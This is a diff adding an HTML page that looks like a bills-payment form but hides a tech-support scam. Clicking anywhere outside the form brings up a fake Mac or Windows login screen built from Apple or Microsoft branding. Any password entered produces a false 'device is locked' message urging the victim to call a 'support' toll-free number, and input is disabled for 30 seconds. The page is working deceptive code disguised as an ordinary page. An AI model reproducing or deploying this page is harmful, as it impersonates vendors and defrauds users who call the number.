@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bills Payment & OS Login Screen</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Bills Payment Styles */
+    #paymentSection {
+      background-color: #f3f4f6;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    /* OS Login Screen Styles */
+    #loginSection {
+      display: none;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+      background-size: cover;
+      background-position: center;
+      background-color: #000; /* Fallback background */
+      overflow: hidden;
+    }
+    .mac-bg {
+      background-image: url('https://www.apple.com/v/macos/ventura/a/images/overview/hero/wallpaper_dynamic_1_dark__c1z2x4k6v3iq_large.jpg');
+      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    .windows-bg {
+      background-image: url('https://www.microsoft.com/en-us/windows/r/images/wallpaper/windows-11-bloom-dark.jpg');
+      font-family: 'Segoe UI', Roboto, sans-serif;
+    }
+    .card {
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(12px);
+      padding: 32px;
+      border-radius: 16px;
+      text-align: center;
+      width: 340px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+    .mac-card {
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .windows-card {
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .avatar img {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      background: rgba(255, 255, 255, 0.15);
+      padding: 12px;
+      display: block;
+    }
+    .user-name {
+      font-size: 20px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin: 20px 0;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: all 0.3s ease;
+    }
+    input[type="password"]::placeholder {
+      color: rgba(255, 255, 255, 0.5);
+    }
+    input[type="password"]:focus {
+      outline: none;
+      background: rgba(255, 255, 255, 0.3);
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 0;
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      background: #0078d7;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .mac-button {
+      background: linear-gradient(to bottom, #3a8ee6, #1668c4);
+    }
+    .windows-button {
+      background: linear-gradient(to bottom, #0078d4, #005a9e);
+    }
+    button:hover {
+      filter: brightness(1.1);
+    }
+    .error {
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #ff4d4d;
+      display: none;
+      line-height: 1.4;
+    }
+    .avatar img {
+      filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.5));
+    }
+    .avatar img:hover {
+      transform: scale(1.05);
+      transition: all 0.3s ease;
+      filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.7));
+    }
+  </style>
+</head>
+<body>
+  <!-- Bills Payment Section -->
+  <div id="paymentSection">
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+      <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">Bills Payment</h1>
+      
+      <div id="paymentForm" class="space-y-4">
+        <div>
+          <label for="billType" class="block text-sm font-medium text-gray-700">Bill Type</label>
+          <select id="billType" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <option value="">Select Bill Type</option>
+            <option value="electricity">Electricity</option>
+            <option value="water">Water</option>
+            <option value="internet">Internet</option>
+            <option value="phone">Phone</option>
+          </select>
+        </div>
+
+        <div>
+          <label for="accountNumber" class="block text-sm font-medium text-gray-700">Account Number</label>
+          <input type="text" id="accountNumber" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter account number">
+        </div>
+
+        <div>
+          <label for="amount" class="block text-sm font-medium text-gray-700">Amount ($)</label>
+          <input type="number" id="amount" class="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter amount" min="0" step="0.01">
+        </div>
+
+        <div>
+          <label class="block text-sm font-medium text-gray-700">Payment Method</label>
+          <div class="mt-2 space-y-2">
+            <div>
+              <input type="radio" id="creditCard" name="paymentMethod" value="creditCard" class="mr-2">
+              <label for="creditCard" class="text-sm text-gray-700">Credit Card</label>
+            </div>
+            <div>
+              <input type="radio" id="bankTransfer" name="paymentMethod" value="bankTransfer" class="mr-2">
+              <label for="bankTransfer" class="text-sm text-gray-700">Bank Transfer</label>
+            </div>
+            <div>
+              <input type="radio" id="paypal" name="paymentMethod" value="paypal" class="mr-2">
+              <label for="paypal" class="text-sm text-gray-700">PayPal</label>
+            </div>
+          </div>
+        </div>
+
+        <button id="payButton" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">Pay Now</button>
+      </div>
+
+      <div id="confirmation" class="hidden mt-4 p-4 bg-green-100 text-green-700 rounded-md">
+        <p id="confirmationMessage"></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- OS Login Screen Section -->
+  <div id="loginSection">
+    <div class="card" id="loginCard">
+      <div class="avatar" id="avatar"></div>
+      <div class="user-name" id="userName"></div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password"/>
+      </div>
+      <button id="signInButton" onclick="checkPassword()">Sign in</button>
+      <div class="error" id="errorMsg"></div>
+    </div>
+  </div>
+
+  <script>
+    // Bills Payment Script
+    const payButton = document.getElementById('payButton');
+    const paymentForm = document.getElementById('paymentForm');
+    const confirmation = document.getElementById('confirmation');
+    const confirmationMessage = document.getElementById('confirmationMessage');
+    const paymentSection = document.getElementById('paymentSection');
+    const loginSection = document.getElementById('loginSection');
+
+    payButton.addEventListener('click', () => {
+      const billType = document.getElementById('billType').value;
+      const accountNumber = document.getElementById('accountNumber').value;
+      const amount = document.getElementById('amount').value;
+      const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked');
+
+      if (!billType || !accountNumber || !amount || !paymentMethod) {
+        alert('Please fill in all fields and select a payment method.');
+        return;
+      }
+
+      if (amount <= 0) {
+        alert('Please enter a valid amount.');
+        return;
+      }
+
+      paymentForm.classList.add('hidden');
+      confirmation.classList.remove('hidden');
+      confirmationMessage.textContent = `Payment of $${amount} for ${billType} bill (Account: ${accountNumber}) via ${paymentMethod.value} was successful!`;
+    });
+
+    // Trigger login screen on click anywhere except form inputs
+    document.addEventListener('click', (event) => {
+      if (!paymentSection.classList.contains('hidden') &&
+          !event.target.closest('#paymentForm') &&
+          !event.target.closest('#confirmation')) {
+        paymentSection.classList.add('hidden');
+        loginSection.style.display = 'flex';
+      }
+    });
+
+    // OS Login Screen Script
+    const avatar = document.getElementById('avatar');
+    const userName = document.getElementById('userName');
+    const errorMsg = document.getElementById('errorMsg');
+    const card = document.getElementById('loginCard');
+    const signInButton = document.getElementById('signInButton');
+
+    function detectOS(){
+      const ua = navigator.userAgent;
+      if (/Mac|iPhone|iPad/.test(ua)) {
+        loginSection.classList.add('mac-bg');
+        card.classList.add('mac-card');
+        signInButton.classList.add('mac-button');
+        return 'mac';
+      }
+      loginSection.classList.add('windows-bg');
+      card.classList.add('windows-card');
+      signInButton.classList.add('windows-button');
+      return 'windows';
+    }
+    const os = detectOS();
+
+    // Set avatar and user name based on OS
+    if(os === 'mac'){
+      avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple logo"/>`;
+      userName.innerText = 'Mac User';
+    } else {
+      avatar.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Windows logo"/>`;
+      userName.innerText = 'Windows User';
+    }
+
+    function checkPassword(){
+      const pwd = document.getElementById('password').value;
+      if(pwd.length > 0){
+        if(os === 'mac'){
+          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
+        } else {
+          errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
+        }
+        errorMsg.style.display = 'block';
+        document.getElementById('password').disabled = true;
+        setTimeout(()=>{
+          document.getElementById('password').disabled = false;
+          errorMsg.style.display = 'none';
+          document.getElementById('password').value = '';
+        }, 30000);
+      }
+    }
+  </script>
+</body>
+</html>
